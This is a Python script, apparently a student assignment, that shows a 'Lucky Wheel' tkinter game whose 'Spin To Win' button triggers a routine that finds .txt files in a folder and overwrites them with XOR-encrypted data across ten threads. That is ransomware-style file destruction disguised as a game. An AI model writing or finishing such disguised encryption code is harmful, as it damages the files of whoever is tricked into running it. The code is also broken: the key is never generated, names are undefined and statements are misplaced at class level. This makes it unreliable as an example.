from tkinter import *
import tkinter.font as font
from tkinter import messagebox
from tkinter import ttk
from PIL import Image
import queue
import mysql.connector
import os
import random
import socket
from datetime import datetime
import threading
from queue import Queue



class Encryption:
    def __init__(self):
        self.image = Image.open("spin.png")
        self.pic = self.image.resize((500, 600))
        self.pic.save('spin1.png')

        root=Tk()
        root.geometry('500x600+500+100')
        root.minsize(500,600)
        root.maxsize(500,600)
        root.title('Lucky Wheel')
        root.configure(bg='Sky blue')

        self.pic = PhotoImage(file='spin1.png')

        self.f1=font.Font(family='Serif',size='30')
        self.f2=font.Font(family='Serif',size='10')
        self.f3=font.Font(family='Serif',size='20')

        l = Label(root, image=self.pic)
        l.pack()

        main =Label(root,text='Spin the Lucky Wheel', bg='Gold',fg='Red')
        main['font']=self.f1
        main.place(relx='0.48',rely='0.1', anchor='center')

        convert=Button(root,text='-Spin To Win-',bg='red',fg='Gold',width=10, command=encryption)
        convert['font']=self.f2
        convert.place(relx='0.42',rely='0.9')


    def encryption(self):
        self.encrypted_ext = ('.txt')

         #all files from machine
        self.file_paths = []
        for root, dirs, files in os.walk("E:\Python Semester 2\Assignment\Test"):
            for file in files:
                self.file_path, file_ext = os.path.splitext(root+'\\'+file)
                if file_ext in self.encrypted_ext:
                    self.file_paths.append(root+'\\'+file)

        #generate key
        self.key = ''
        self.encryption_level = 512 // 8
        self.char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789<>?,./:;[]}{|'
        self.char_pool_len = len(self.char_pool)

    def encrypt(self, key):
        while q.not_empty:
                file = q.get()
                index = 0
                max_index =len(self.key) - 1
                try:
                    with open(file, 'rb') as f:
                        data = f.read()
                    with open(file,'w') as f:
                        f.write('')

                    for byte in data:
                        xor_byte = byte ^ ord(self.key[index])
                        with open(file, 'ab') as f:
                            f.write(xor_byte.to_bytes(1, 'little'))
                        if index >= max_index:
                            index = 0 
                        else: 
                            index += 1
                except:
                    print(f"Failed to encrypt {file}")
                q.task_done()

    q = Queue()

    for file in self.file_paths:
        q.put(file)

    for i in range(10):
        thread = threading.Thread(target=encrypt, args=(self.key,), daemon=True)
        thread.start()
    q.join()  





